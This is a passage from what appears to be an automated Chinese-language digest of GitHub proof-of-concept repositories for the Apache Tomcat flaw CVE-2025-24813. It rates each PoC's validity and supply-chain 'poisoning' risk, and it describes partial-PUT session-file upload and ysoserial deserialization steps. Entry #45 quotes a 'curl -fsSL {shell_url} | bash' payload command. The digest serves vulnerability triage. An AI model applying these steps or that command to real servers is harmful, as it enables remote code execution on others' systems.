**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

